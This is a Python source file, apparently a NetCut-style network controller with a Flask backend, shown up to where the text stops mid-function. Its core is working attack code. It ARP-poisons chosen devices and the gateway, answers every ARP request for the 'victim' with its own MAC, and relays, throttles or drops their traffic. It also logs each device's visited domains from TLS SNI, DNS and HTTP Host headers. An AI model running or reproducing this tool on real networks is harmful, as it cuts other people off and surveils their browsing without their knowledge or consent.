#!/usr/bin/env python3
import os, sys, json, time, signal, threading, socket, subprocess, re, urllib.request, struct, ipaddress, math
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from collections import defaultdict, deque

sys.setswitchinterval(0.0005)

import netifaces
from scapy.all import *
from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP
from flask import Flask, jsonify, request, render_template

DATA_FILE = Path(__file__).parent / "devices.json"
VERSION = "2.2.0"
app = Flask(__name__)

class Device:
    def __init__(self, ip, mac, hostname=None, vendor=None, custom_name=None):
        self.ip = ip; self.mac = mac
        self.hostname = hostname or "Unknown"; self.vendor = vendor or "Unknown"
        self.custom_name = custom_name or ""
        self.state = "Connected"
        self.spoof_stop = None; self.spoof_thread = None
        self.throttle_kbps = None
        self.watch = False
        self.relay_error = None
        self.first_seen = time.time()
        self.last_seen = time.time()

    def to_dict(self):
        dn = (self.custom_name or
              self.vendor if self.vendor != "Unknown" else
              self.hostname if self.hostname != "Unknown" else
              self.ip)
        return {"ip": self.ip, "mac": self.mac, "hostname": self.hostname,
                "vendor": self.vendor, "custom_name": self.custom_name,
                "state": self.state, "display_name": dn,
                "throttle_kbps": self.throttle_kbps,
                "watch": self.watch,
                "relay_error": self.relay_error,
                "first_seen": self.first_seen, "last_seen": self.last_seen}

class TrafficMonitor:
    def __init__(self):
        self.traffic = defaultdict(int)
        self.quota_bytes = 0
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.thread = None

    def packet_handler(self, pkt, tracked_ips=None, blocked_ips=None, our_mac=None):
        """Count observed device traffic and quota traffic once per packet.

        Frames transmitted by our relay are ignored because the original frame
        was already captured on ingress. Blocked-device packets are attempts,
        not delivered internet usage, so they are excluded entirely. Traffic
        between two tracked LAN clients is visible per device but is not added
        to the internet quota.
        """
        if IP not in pkt:
            return
        if our_mac and Ether in pkt and pkt[Ether].src.lower() == our_mac.lower():
            return
        tracked = set(tracked_ips or ())
        blocked = set(blocked_ips or ())
        endpoints = {pkt[IP].src, pkt[IP].dst} & tracked
        active = endpoints - blocked
        if not active:
            return
        size = len(pkt)
        with self.lock:
            for ip in active:
                self.traffic[ip] += size
            if len(endpoints) == 1:
                self.quota_bytes += size

    def start(self, interface):
        with self.lock:
            self.traffic.clear()
            self.quota_bytes = 0

    def stop(self): pass
    def get_traffic(self):
        with self.lock:
            return {ip: round(b/1024, 1) for ip, b in self.traffic.items()}

    def snapshot_bytes(self):
        with self.lock:
            return dict(self.traffic)

    def total_bytes(self):
        with self.lock:
            return self.quota_bytes

    def clear_ip(self, ip):
        with self.lock:
            self.traffic.pop(ip, None)

class DomainWatcher:
    """Passive watcher that records which domains each device visits.

    Uses three signals visible on the local segment:
      - TLS ClientHello SNI (dst port 443)
      - DNS queries (port 53)
      - HTTP request Host header (dst port 80)
    Notice: this relies on the traffic crossing our NIC (normal for any
    ARP-inspecting client on the same segment / when MITM is active).
    """
    MAX_PER_IP = 60
    WINDOW = 60 * 60  # forget domains idle for > 1 hour

    def __init__(self):
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.thread = None
        self.domains = defaultdict(dict)  # ip -> {domain: {count, last}}

    def _parse_sni(self, data):
        try:
            if data[0] != 0x16: return None
            if data[5] != 0x01: return None
            pos = 5 + 4      # skip handshake type+len
            pos += 2         # TLS version
            pos += 32        # random
            sid_len = data[pos]; pos += 1 + sid_len
            cs_len = int.from_bytes(data[pos:pos+2], 'big'); pos += 2 + cs_len
            cm_len = data[pos]; pos += 1 + cm_len
            ext_total = int.from_bytes(data[pos:pos+2], 'big'); pos += 2
            end = pos + ext_total
            while pos + 4 <= end:
                etype = int.from_bytes(data[pos:pos+2], 'big')
                elen = int.from_bytes(data[pos+2:pos+4], 'big')
                pos += 4
                if etype == 0:  # server_name
                    npos = pos + 2
                    while npos + 3 < pos + elen:
                        ntype = data[npos]; nlen = int.from_bytes(data[npos+1:npos+3], 'big'); npos += 3
                        if ntype == 0:
                            name = data[npos:npos+nlen].decode('utf-8', 'ignore')
                            return name
                        npos += nlen
                    return None
                pos += elen
        except Exception:
            return None
        return None

    def sniff_http_host(self, data):
        try:
            z = data.split(b"\r\n")
            if not z: return None
            if not (z[0].startswith(b"GET ") or z[0].startswith(b"POST ") or
                    z[0].startswith(b"HEAD ") or z[0].startswith(b"PUT ") or
                    z[0].startswith(b"DELETE ")):
                return None
            for line in z[1:]:
                if line.lower().startswith(b"host:"):
                    host = line[5:].strip().decode('utf-8', 'ignore')
                    return host.split(':')[0] if ':' in host else host
        except Exception:
            return None
        return None

    def record(self, ip, domain):
        if not domain or len(domain) > 253: return
        now = time.time()
        with self.lock:
            d = self.domains[ip]
            if domain in d:
                d[domain]["count"] += 1
                d[domain]["last"] = now
            else:
                if len(d) >= self.MAX_PER_IP:
                    oldest = min(d.items(), key=lambda kv: kv[1]["last"])
                    del d[oldest[0]]
                d[domain] = {"count": 1, "last": now}

    def packet_handler(self, pkt):
        try:
            if IP not in pkt: return
            ip = pkt[IP]
            if TCP in pkt:
                tcp = pkt[TCP]
                if Raw in tcp:
                    raw = bytes(tcp[Raw].load)
                    if tcp.dport == 443 and raw:
                        d = self._parse_sni(raw)
                        if d: self.record(ip.src, d)
                    elif tcp.dport == 80 and raw:
                        h = self.sniff_http_host(raw)
                        if h: self.record(ip.src, h)
            if DNS in pkt and pkt[DNS].qd:
                try:
                    name = pkt[DNS].qd.qname.decode('utf-8', 'ignore').rstrip('.')
                except Exception:
                    name = None
                if name: self.record(ip.src, name)
        except Exception:
            pass

    def start(self, interface):
        self.stop_event.clear()
        with self.lock:
            self.domains.clear()

    def set_stop(self):
        self.stop_event.set()

    def get_domains(self, since=None):
        now = time.time()
        with self.lock:
            out = {}
            for ip, doms in self.domains.items():
                keep = {d: v for d, v in doms.items()
                        if not since or v["last"] >= since}
                keep = {d: v for d, v in keep.items() if now - v["last"] < self.WINDOW}
                if keep: out[ip] = keep
            return out

class QuotaTracker:
    """Monthly internet quota tracking + auto-throttle / auto-block.

    Samples total traffic flowing through the interface, accumulates the
    delta into a monthly counter, and decides when to start throttling or
    blocking all non-self devices based on thresholds.
    """
    def __init__(self):
        self.lock = threading.Lock()
        self.enabled = False
        self.limit_gb = 0.0
        self.throttle_kbps = 300
        self.throttle_pct = 80.0
        self.block_pct = 100.0
        self.used_bytes = 0.0
        self.month_start = time.time()
        self.prev_snapshot = {}
        self.last_pct = 0.0
        self.mode = None
        self.managed_devices = {}

    def load(self, cfg):
        if not isinstance(cfg, dict): return
        with self.lock:
            self.enabled = bool(cfg.get("enabled", self.enabled))
            self.limit_gb = float(cfg.get("limit_gb", self.limit_gb))
            self.throttle_kbps = int(cfg.get("throttle_kbps", self.throttle_kbps))
            self.throttle_pct = float(cfg.get("throttle_pct", self.throttle_pct))
            self.block_pct = float(cfg.get("block_pct", self.block_pct))
            self.used_bytes = float(cfg.get("used_bytes", self.used_bytes))
            self.month_start = float(cfg.get("month_start", self.month_start))
            managed = cfg.get("managed_devices", {})
            self.managed_devices = managed if isinstance(managed, dict) else {}

    def to_dict(self):
        with self.lock:
            return {"enabled": self.enabled, "limit_gb": self.limit_gb,
                    "throttle_kbps": self.throttle_kbps,
                    "throttle_pct": self.throttle_pct,
                    "block_pct": self.block_pct,
                    "used_mb": round(self.used_bytes / 1048576, 1),
                    "used_pct": round(self.percent(), 1),
                    "mode": self.mode,
                    "month_start": self.month_start}

    def reset(self):
        with self.lock:
            self.used_bytes = 0.0
            self.month_start = time.time()
            self.mode = None

    def add_usage(self, delta):
        if delta <= 0: return
        with self.lock:
            self.used_bytes += delta

    def percent(self):
        if not self.limit_gb or self.limit_gb <= 0:
            return 0.0
        return (self.used_bytes / (self.limit_gb * 1e9)) * 100.0

    def state(self):
        with self.lock:
            return {"enabled": self.enabled, "limit_gb": self.limit_gb,
                    "throttle_kbps": self.throttle_kbps,
                    "throttle_pct": self.throttle_pct,
                    "block_pct": self.block_pct,
                    "used_bytes": self.used_bytes,
                    "month_start": self.month_start,
                    "managed_devices": self.managed_devices}

class TokenBucketForwarder:
    """Real per-device bandwidth shaping (MITM relay).

    The target device is ARP-poisoned so its traffic to/from the gateway
    physically crosses our NIC. This class sniffs those frames, enforces a
    token bucket per target (dropping frames that exceed the configured
    bit-rate), and re-transmits the allowed frames out the same NIC on the
    correct leg. Watch-only targets are relayed at full speed without shaping.

    IMPORTANT: the relaying socket is opened ONCE and reused, because
    scapy's sendp() opens and closes a raw socket on every call which
    collapses throughput (devices look "cut off" at high bit-rates).
    """
    def __init__(self):
        self._targets = {}
        self.lock = threading.Lock()
        self.thread = None
        self.drain_thread = None
        self.stop_event = threading.Event()
        self.gateway_ip = None; self.gateway_mac = None
        self.our_mac = None; self.our_ip = None; self.interface = None
        self.sock = None
        self.stats = {"enqueued": 0, "sent": 0, "sent_bytes": 0, "dropped": 0,
                      "errors": 0, "last_error": None, "sock_open": False}

    def configure(self, gateway_ip=None, gateway_mac=None, our_mac=None, our_ip=None, interface=None):
        with self.lock:
            if gateway_ip is not None: self.gateway_ip = gateway_ip
            if gateway_mac is not None: self.gateway_mac = gateway_mac
            if our_mac is not None: self.our_mac = our_mac
            if our_ip is not None: self.our_ip = our_ip
            if interface is not None: self.interface = interface

    def set_target(self, ip, kbps, mac=None, watch=False):
        with self.lock:
            if kbps and kbps > 0:
                existing = self._targets.get(ip)
                if existing:
                    existing["kbps"] = kbps
                    existing["mac"] = mac or existing["mac"]
                    existing["watch"] = bool(watch)
                else:
                    rate = (kbps * 1000) / 8.0
                    now = time.time()
                    self._targets[ip] = {"kbps": kbps, "mac": mac,
                                         "watch": bool(watch),
                                         "q": deque(), "cq": deque(),
                                         "qbytes": 0, "cbytes": 0,
                                         "tokens": min(rate * 0.05, 64 * 1024),
                                         "last": now,
                                         "created": now, "last_frame_at": None,
                                         "last_up_at": None, "last_down_at": None,
                                         "bw_bytes": 0, "bw_last": now,
                                         "down": 0, "up": 0,
                                         "trace": deque(maxlen=24)}
            else:
                self._targets.pop(ip, None)

    def _entry(self, ip):
        with self.lock:
            return self._targets.get(ip)

    def active(self):
        with self.lock:
            return {ip: t["kbps"] for ip, t in self._targets.items()}

    def start(self):
        self.stop_event.clear()
        self._open_sock()
        if not (self.drain_thread and self.drain_thread.is_alive()):
            self.drain_thread = threading.Thread(target=self._drain, daemon=True)
            self.drain_thread.start()

    def set_stop(self):
        self.stop_event.set()

    def clear(self):
        with self.lock:
            self._targets.clear()

    def _open_sock(self):
        if self.interface:
            try:
                self.sock = open_l2socket(self.interface)
                self.stats["sock_open"] = True
                return
            except Exception as ex:
                self.stats["sock_open"] = False
                self.stats["last_error"] = repr(ex)
        self.sock = None

    def _run(self, interface):
        self._open_sock()

    def _send(self, frame_bytes):
        try:
            if self.sock is None:
                self._open_sock()
            if self.sock is not None:
                self.sock.send(frame_bytes)
                self.stats["sent"] += 1
                self.stats["sent_bytes"] += len(frame_bytes)
                return True
        except Exception as ex:
            self.stats["errors"] += 1
            self.stats["last_error"] = repr(ex)
            self._open_sock()
        return False

    def _drain(self):
        MAX_Q = 256 * 1024  # ~0.2s latency bound at 11 Mbps, not a 1s+ pipe
        while not self.stop_event.is_set():
            now = time.time()
            did = False
            targets = None
            with self.lock:
                targets = list(self._targets.values())
            for t in targets:
                if t["watch"]:
                    q = t["q"]; cq = t["cq"]
                    while cq:
                        b = cq.popleft()
                        t["cbytes"] -= len(b)
                        if not self._send(b): self.stats["dropped"] += 1
                        did = True
                        if self.stop_event.is_set(): return
                    while q:
                        b = q.popleft()
                        t["qbytes"] -= len(b)
                        if not self._send(b): self.stats["dropped"] += 1
                        did = True
                        if self.stop_event.is_set(): return
                    continue
                rate = (t["kbps"] * 1000) / 8.0
                # Keep only a short burst allowance. A one-second bucket made
                # low limits look ineffective during short mobile speed tests.
                burst = max(rate * 0.1, 2048)
                t["tokens"] = min(t["tokens"] + (now - t["last"]) * rate, burst)
                t["last"] = now
                q = t["q"]; cq = t["cq"]
                # Control frames (SYN/ACK/DNS, usually <100B) keep priority,
                # but they must consume tokens too. Sending them unmetered let
                # iPhone TCP ACK traffic add ~0.5 Mbps above the selected cap.
                while cq and t["tokens"] >= len(cq[0]):
                    b = cq.popleft()
                    t["cbytes"] -= len(b)
                    t["tokens"] -= len(b)
                    t["bw_bytes"] += len(b)
                    if not self._send(b): self.stats["dropped"] += 1
                    did = True
                    if self.stop_event.is_set(): return
                while q and t["tokens"] >= len(q[0]):
                    b = q.popleft()
                    t["qbytes"] -= len(b)
                    t["tokens"] -= len(b)
                    t["bw_bytes"] += len(b)
                    if not self._send(b): self.stats["dropped"] += 1
                    did = True
                    if self.stop_event.is_set(): return
                if t["qbytes"] + t["cbytes"] > MAX_Q:
                    excess = t["qbytes"] + t["cbytes"] - MAX_Q
                    while q and excess > 0:
                        b = q.popleft()
                        t["qbytes"] -= len(b)
                        excess -= len(b)
                        self.stats["dropped"] += 1
                        if self.stop_event.is_set(): return
                    while cq and excess > 0:
                        b = cq.popleft()
                        t["cbytes"] -= len(b)
                        excess -= len(b)
                        self.stats["dropped"] += 1
                        if self.stop_event.is_set(): return
            # Always yield to the sniff thread so it can feed us (and so the
            # machine's own TCP stack/timers aren't starved). Without this the
            # drain busy-spins, tokens refill with dt~0 (cap not honored) and
            # the whole PC's networking stalls -> device looks offline.
            time.sleep(0.001)

    def _on_packet(self, pkt):
        try:
            if Ether not in pkt or IP not in pkt: return
            e = pkt[Ether]; ip = pkt[IP]
            if e.src == self.our_mac: return
            if self.gateway_ip is None: return
            src, dst = ip.src, ip.dst
            if dst == self.gateway_ip and src == self.our_ip:
                return
            tgt_dst = self._entry(dst)      # packet addressed TO a throttled dev
            tgt_src = self._entry(src)      # packet sent FROM a throttled dev
            if tgt_dst is None and tgt_src is None:
                return
            if tgt_dst is not None:
                entry = tgt_dst
                out = Ether(dst=entry["mac"], src=self.our_mac) / pkt[IP]
                entry["down"] += 1
                entry["last_down_at"] = time.time()
            else:
                entry = tgt_src
                out = Ether(dst=self.gateway_mac, src=self.our_mac) / pkt[IP]
                entry["up"] += 1
                entry["last_up_at"] = time.time()
            with self.lock:
                entry["last_frame_at"] = time.time()
                out_b = bytes(out)
                if len(out_b) < 100:
                    entry["cq"].append(out_b)
                    entry["cbytes"] += len(out_b)
                else:
                    entry["q"].append(out_b)
                    entry["qbytes"] += len(out_b)
                self.stats["enqueued"] += 1
                self.stats["last_frame"] = "%s->%s %dB" % (
                    src, dst, len(out_b))
        except Exception as ex:
            self.stats["errors"] += 1
            self.stats["last_error"] = repr(ex)

    def report(self):
        now = time.time()
        with self.lock:
            targets = {}
            for ip, t in self._targets.items():
                span = now - t["bw_last"]
                live = round((t["bw_bytes"] * 8) / span / 1e6, 2) if span > 0 else 0.0
                t["bw_bytes"] = 0
                t["bw_last"] = now
                last_frame = t.get("last_frame_at")
                if not self.stats.get("sock_open"):
                    health = "error"
                elif last_frame is None:
                    health = "waiting"
                elif now - last_frame <= 10:
                    health = "active"
                else:
                    health = "idle"
                targets[ip] = {"kbps": t["kbps"], "mac": t["mac"],
                               "watch": t["watch"],
                               "qbytes": t["qbytes"] + t["cbytes"],
                               "queued_frames": len(t["q"]) + len(t["cq"]),
                               "control_queued": len(t["cq"]),
                               "down_frames": t["down"],
                               "up_frames": t["up"],
                               "health": health,
                               "age_seconds": round(now - t["created"], 1),
                               "last_frame_seconds": (round(now - last_frame, 1)
                                                      if last_frame else None),
                               "live_mbps": live}
            return {"targets": targets, "stats": dict(self.stats)}

    def health_snapshot(self):
        now = time.time()
        with self.lock:
            return {ip: {"age": now - t["created"], "up": t["up"],
                         "down": t["down"], "watch": t["watch"]}
                    for ip, t in self._targets.items()}

def open_l2socket(iface):
    from scapy.config import conf
    return conf.L2socket(iface=iface)

class NetCutController:
    def __init__(self):
        self.interface = None; self.ip = None; self._iface_idx = None
        self.gateway_ip = None; self.gateway_mac = None
        self.devices = []; self.saved_data = self.load_saved()
        self.scanning = False; self.scan_progress = 0
        self.traffic = TrafficMonitor()
        self.forwarder = TokenBucketForwarder()
        self.watcher = DomainWatcher()
        self.quota = QuotaTracker()
        self.quota.load(self.saved_data.get('quota'))
        self._last_traffic_total = 0
        self.auto_scan_stop = threading.Event()
        self.auto_scan_thread = None
        self.capture_thread = None
        self.capture_stop = threading.Event()
        self.our_mac = None
        self.our_ip = None
        self.state_lock = threading.RLock()
        self.watch_lan_enabled = False
        self.watch_lan_macs = set()
        self.pinned_neighbors = {}
        self.safety_stop = threading.Event()
        self.safety_thread = None
        self.safety_events = deque(maxlen=20)

    def save_quota(self):
        with self.state_lock:
            self.saved_data['quota'] = self.quota.state()
            self._write_saved()

    def load_saved(self):
        if DATA_FILE.exists():
            try:
                with open(DATA_FILE) as f: return json.load(f)
            except: return {}
        return {}

    def save_device(self, mac, data):
        with self.state_lock:
            entry = self.saved_data.get(mac, {})
            entry.update(data)
            self.saved_data[mac] = entry
            self._write_saved()

    def _write_saved(self):
        temp_file = DATA_FILE.with_suffix('.json.tmp')
        with open(temp_file, 'w') as f:
            json.dump(self.saved_data, f, indent=2)
            f.flush()
            os.fsync(f.fileno())
        os.replace(temp_file, DATA_FILE)

    def get_vendor(self, mac):
        saved = self.saved_data.get(mac, {})
        if saved.get("vendor"):
            return saved["vendor"]
        try:
            req = urllib.request.Request(
                f"https://api.macvendors.com/{mac}",
                headers={'User-Agent': 'Python-urllib/3.0'})
            with urllib.request.urlopen(req, timeout=3) as r:
                vendor = r.read().decode().strip()
                if vendor:
                    self.save_device(mac, {"vendor": vendor})
                    return vendor
        except: pass
        return None

    def discover_interfaces(self):
        if os.name == 'nt':
            from scapy.arch.windows import get_windows_if_list
            iface_list = get_windows_if_list()
        else: iface_list = []
        available = []
        if os.name == 'nt':
            for iface in iface_list:
                name = iface.get('name', '')
                ips = [ip for ip in iface.get('ips', []) if '.' in ip and not ip.startswith('169.254')]
                desc = iface.get('description', '')
                if ips and name and not any(x in desc for x in ['WAN Miniport', 'Kernel Debug', 'VPN', 'Loopback', 'Teredo', '6to4', 'IP-HTTPS']):
                    available.append((name, ips[0], desc, iface.get('index')))
        else:
            for i in netifaces.interfaces():
                if i == 'lo': continue
                addrs = netifaces.ifaddresses(i)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    if not ip.startswith('169.254'): available.append((i, ip, i, None))
        if not available: return None, "No usable interfaces."
        gateways = netifaces.gateways()
        gw = gateways['default'][netifaces.AF_INET][0] if 'default' in gateways and netifaces.AF_INET in gateways['default'] else None
        sel = None
        if gw: sel = next((x for x in available if x[1] == gw), None)
        if not sel and gw:
            pfx = '.'.join(gw.split('.')[:3])
            sel = next((x for x in available if x[1].startswith(pfx)), None)
        if not sel: sel = next((x for x in available if 'Ethernet' in x[0] or 'Wi-Fi' in x[0] or 'eth' in x[0]), None)
        if not sel: sel = available[0]
        self.interface, self.ip, _, self._iface_idx = sel
        self.our_mac = get_if_hwaddr(self.interface)
        self.our_ip = self.ip
        self.forwarder.configure(interface=self.interface, gateway_ip=gw, our_mac=self.our_mac, our_ip=self.ip)
        if not gw: return None, "No default gateway."
        self.gateway_ip = gw
        return True, None

    def get_device_info(self, ip, mac):
        hostname = None
        try:
            hn = socket.gethostbyaddr(ip); hostname = hn[0]
        except: pass
        vendor = self.get_vendor(mac)
        return hostname, vendor

    def _pin_local_neighbor(self, ip, mac):
        """Keep forged ARP packets from poisoning this PC's own cache."""
        if not ip or not mac or mac.lower() == (self.our_mac or '').lower():
            return False
        try:
            if os.name == 'nt':
                cmd = ["netsh", "interface", "ipv4", "set", "neighbors",
                       f"interface={self._iface_idx}", f"address={ip}",
                       f"neighbor={mac.replace(':', '-')}", "store=active"]
            else:
                cmd = ["ip", "neigh", "replace", ip, "lladdr", mac,
                       "nud", "permanent", "dev", self.interface]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3)
            if result.returncode == 0:
                self.pinned_neighbors[ip] = mac
                return True
        except Exception:
            pass
        return False

    def _unpin_local_neighbor(self, ip):
        if ip not in self.pinned_neighbors:
            return
        try:
            if os.name == 'nt':
                cmd = ["netsh", "interface", "ipv4", "delete", "neighbors",
                       f"interface={self._iface_idx}", f"address={ip}",
                       "store=active"]
            else:
                cmd = ["ip", "neigh", "del", ip, "dev", self.interface]
            subprocess.run(cmd, capture_output=True, text=True, timeout=3)
        except Exception:
            pass
        self.pinned_neighbors.pop(ip, None)

    def _pin_control_path(self, dev):
        gateway_ok = self._pin_local_neighbor(self.gateway_ip, self.gateway_mac)
        target_ok = self._pin_local_neighbor(dev.ip, dev.mac)
        return gateway_ok and target_ok

    def _clear_neighbor_pins(self):
        for ip in list(self.pinned_neighbors):
            self._unpin_local_neighbor(ip)

    def arp_scan(self, passes=2, timeout=2.0):
        conf.verb = 0
        netmask = None
        try:
            addresses = netifaces.ifaddresses(self.interface).get(netifaces.AF_INET, [])
            for address in addresses:
                if address.get('addr') == self.ip:
                    netmask = address.get('netmask')
                    break
        except (ValueError, OSError):
            pass
        try:
            target = str(ipaddress.ip_network(f"{self.ip}/{netmask or '255.255.255.0'}", strict=False))
        except ValueError:
            target = self.gateway_ip.rsplit('.', 1)[0] + ".0/24"
        req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target)
        result = {}
        for _ in range(passes):
            try:
                ans, _ = srp(req, timeout=timeout, retry=0, verbose=False)
            except Exception:
                continue
            for s, r in ans:
                ip, mac = r.psrc, r.hwsrc
                if ip == self.ip or mac == self.our_mac:
                    continue
                if mac not in result:
                    result[mac] = ip
                if ip == self.gateway_ip:
                    self.gateway_mac = mac
        return result

    def scan_network(self):
        self.scanning = True; self.scan_progress = 0
        try:
            for d in self.devices:
                if d.spoof_stop: d.spoof_stop.set()
                d.spoof_stop = None; d.spoof_thread = None

            self.scan_progress = 10
            found = self.arp_scan(passes=2)
            self.scan_progress = 60
            self.forwarder.configure(gateway_mac=self.gateway_mac)
            self.merge_scan_results(found)
            self.devices.sort(key=lambda x: x.ip)
            self.scan_progress = 100
            self._start_capture()
            return self.devices
        finally:
            for d in self.devices:
                if d.state in ("Disconnected", "Throttled", "Watched"):
                    self._start_spoof(d)
            self.scanning = False

    def _start_capture(self):
        self.traffic.stop(); self.traffic.start(self.interface)
        self._last_traffic_total = 0
        self.watcher.set_stop(); self.watcher.start(self.interface)
        self.forwarder.start()
        if self.capture_thread and self.capture_thread.is_alive():
            return
        self.capture_stop = threading.Event()
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
        self.safety_stop.clear()
        if not (self.safety_thread and self.safety_thread.is_alive()):
            self.safety_thread = threading.Thread(target=self._safety_loop, daemon=True)
            self.safety_thread.start()

    def _safety_loop(self):
        while not self.safety_stop.wait(2.0):
            try:
                self._check_relay_safety()
            except Exception:
                pass

    def _check_relay_safety(self):
        for ip, status in self.forwarder.health_snapshot().items():
            dominant = max(status["up"], status["down"])
            minority = min(status["up"], status["down"])
            asymmetric = (dominant >= 500 and
                          (minority < 5 or minority / dominant < 0.002))
            if status["age"] < 8 or not asymmetric:
                continue
            device = next((d for d in self.devices if d.ip == ip), None)
            if not device:
                continue
            reason = ("Relay safety stopped this control: traffic was not "
                      "crossing Fnet in both directions.")
            if status["watch"]:
                self.set_watch(device.mac, False, bypass_quota=True)
            else:
                self.set_throttle(device.mac, 0, bypass_quota=True)
            device.relay_error = reason
            self.watch_lan_macs.discard(device.mac)
            if not self.watch_lan_macs:
                self.watch_lan_enabled = False
            self.quota.managed_devices.pop(device.mac, None)
            self.quota.enabled = False
            self.safety_events.append({"time": time.time(), "ip": ip,
                                       "mac": device.mac, "reason": reason,
                                       "up_frames": status["up"],
                                       "down_frames": status["down"]})
            self.save_device(device.mac, {"state": "Connected",
                                          "throttle_kbps": None})
            self.save_quota()

    def _capture_loop(self):
        def feed(pkt):
            self._arp_owner(pkt)
            tracked_ips = {d.ip for d in self.devices
                           if d.ip != self.gateway_ip and d.mac != self.our_mac}
            blocked_ips = {d.ip for d in self.devices if d.state == "Disconnected"}
            self.traffic.packet_handler(pkt, tracked_ips, blocked_ips, self.our_mac)
            if IP not in pkt or not ({pkt[IP].src, pkt[IP].dst} & blocked_ips):
                self.watcher.packet_handler(pkt)
            self.forwarder._on_packet(pkt)
        sniff(iface=self.interface, prn=feed, store=0,
              stop_filter=lambda p: self.capture_stop.is_set())

    def _arp_owner(self, pkt):
        """Make the MITM bidirectional.

        We already poison the VICTIM (phone, p1) so it sends to us. But the
        gateway's ARP cache still maps the victim IP to its REAL MAC, so the
        gateway's replies go straight to the phone in an L2 frame that the
        phone (expecting our MAC) drops -> down_frames stays 0 -> no internet.

        This answers EVERY 'who-has <victim-ip>' from anywhere with OUR MAC,
        re-arming the gateway/AP before it can resolve the real MAC. Also
        answers the victim's 'who-has <gateway>' with our MAC for robustness.
        """
        try:
            if ARP not in pkt: return
            a = pkt[ARP]
            claims = {}
            for d in self.devices:
                if d.spoof_stop and not d.spoof_stop.is_set():
                    claims[d.ip] = d
            if not claims: return
            if a.op == 1:  # who-has
                if a.pdst in claims:
                    reply = Ether(dst=pkt.src, src=self.our_mac) / ARP(
                        op=2, hwsrc=self.our_mac, psrc=a.pdst,
                        hwdst=pkt.src, pdst=a.psrc)
                    self._arp_send(reply)
                elif a.pdst == self.gateway_ip and a.psrc in claims:
                    # The target is asking for the gateway. Reply directly to
                    # the target; sending this to the gateway lets the real
                    # gateway answer the phone and bypass the relay.
                    reply = Ether(dst=pkt.src, src=self.our_mac) / ARP(
                        op=2, hwsrc=self.our_mac, psrc=self.gateway_ip,
                        hwdst=pkt.src, pdst=a.psrc)
                    self._arp_send(reply)
            elif a.op == 2 and self.gateway_ip is not None:
                # A genuine ARP reply can repair either side's cache. Re-arm
                # both legs immediately instead of waiting for the timer.
                if a.psrc == self.gateway_ip and a.hwsrc != self.our_mac:
                    for dev in claims.values():
                        self._poison_once(dev)
                elif a.psrc in claims and a.hwsrc != self.our_mac:
                    self._poison_once(claims[a.psrc])
        except Exception:
            pass

    def _arp_send(self, pkt):
        try:
            if self.forwarder and self.forwarder.sock is not None:
                self.forwarder.sock.send(bytes(pkt))
            else:
                sendp(pkt, iface=self.interface, verbose=False)
        except Exception:
            try:
                sendp(pkt, iface=self.interface, verbose=False)
            except Exception:
                pass

    def merge_scan_results(self, found):
        now = time.time()
        by_mac = {d.mac: d for d in self.devices}
        new_macs = [mac for mac in found if mac not in by_mac]

        if new_macs:
            resolved = {}
            with ThreadPoolExecutor(max_workers=4) as ex:
                futures = {mac: ex.submit(self.get_device_info, found[mac], mac) for mac in new_macs}
                for mac, fut in futures.items():
                    try:
                        resolved[mac] = fut.result()
                    except Exception:
                        resolved[mac] = (None, None)
            for mac in new_macs:
                hostname, vendor = resolved.get(mac, (None, None))
                saved = self.saved_data.get(mac, {})
                dev = Device(found[mac], mac, hostname, vendor, saved.get("custom_name", ""))
                if found[mac] == self.gateway_ip:
                    dev.state = "Router (Connected)"
                    self.gateway_mac = mac
                elif saved.get("state") in ("Disconnected", "Throttled", "Watched"):
                    # Never resume an intercept automatically after a process
                    # restart. The previous run may have ended during a relay
                    # failure, and silently reapplying it can disrupt the LAN.
                    self.save_device(mac, {"state": "Connected",
                                           "throttle_kbps": None})
                self.devices.append(dev)

        for mac, ip in found.items():
            dev = by_mac.get(mac)
            if not dev:
                continue
            dev.ip = ip
            dev.last_seen = now
            if dev.state == "Offline":
                dev.state = "Connected"
            if dev.state == "Throttled":
                self.forwarder.set_target(dev.ip, dev.throttle_kbps, dev.mac)
            if dev.state == "Disconnected":
                self._start_spoof(dev)

        for d in self.devices:
            if d.mac in found or d.ip == self.gateway_ip:
                continue
            if d.state != "Disconnected":
                d.state = "Offline"
        if self.watch_lan_enabled:
            self._sync_watch_lan()

    def _start_spoof(self, dev):
        if dev.spoof_stop: return
        dev.spoof_stop = threading.Event()
        dev.spoof_thread = threading.Thread(target=self._spoof_loop, args=(dev,), daemon=True)
        dev.spoof_thread.start()

    def _stop_spoof(self, dev):
        if dev.spoof_stop: dev.spoof_stop.set()
        dev.spoof_stop = None; dev.spoof_thread = None

    def _poison_once(self, dev):
        if not all((dev.mac, dev.ip, self.gateway_ip, self.gateway_mac, self.our_mac)):
            return
        p1 = Ether(dst=dev.mac) / ARP(op=2, pdst=dev.ip, hwdst=dev.mac, psrc=self.gateway_ip, hwsrc=self.our_mac)
        p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=dev.ip, hwsrc=self.our_mac)
        self._arp_send(p1)
        self._arp_send(p2)

    def _spoof_loop(self, dev):
        while dev.spoof_stop and not dev.spoof_stop.is_set():
            self._poison_once(dev)
            time.sleep(1.0)

    def _restore(self, dev):
        p1 = Ether(dst=dev.mac) / ARP(op=2, pdst=dev.ip, hwdst=dev.mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
        p2 = Ether(dst=self.gateway_mac) / ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=dev.ip, hwsrc=dev.mac)
        for _ in range(5):
            self._arp_send(p1)
            self._arp_send(p2)

    def _quota_restricted(self, mac, bypass_quota):
        return (not bypass_quota and self.quota.mode in ("throttle", "block")
                and mac in self.quota.managed_devices)

    def toggle_device(self, mac, bypass_quota=False):
        for d in self.devices:
            if d.mac == mac:
                if d.ip == self.gateway_ip: return False, "Cannot touch gateway."
                if d.mac == self.our_mac: return False, "Cannot touch your own device."
                if self._quota_restricted(mac, bypass_quota):
                    return False, "Quota Auto-Mode is controlling this device."
                if d.state != "Disconnected":
                    if not self._pin_control_path(d):
                        return False, "Could not protect this PC's neighbor table; control was not started."
                    d.state = "Disconnected"
                    d.watch = False
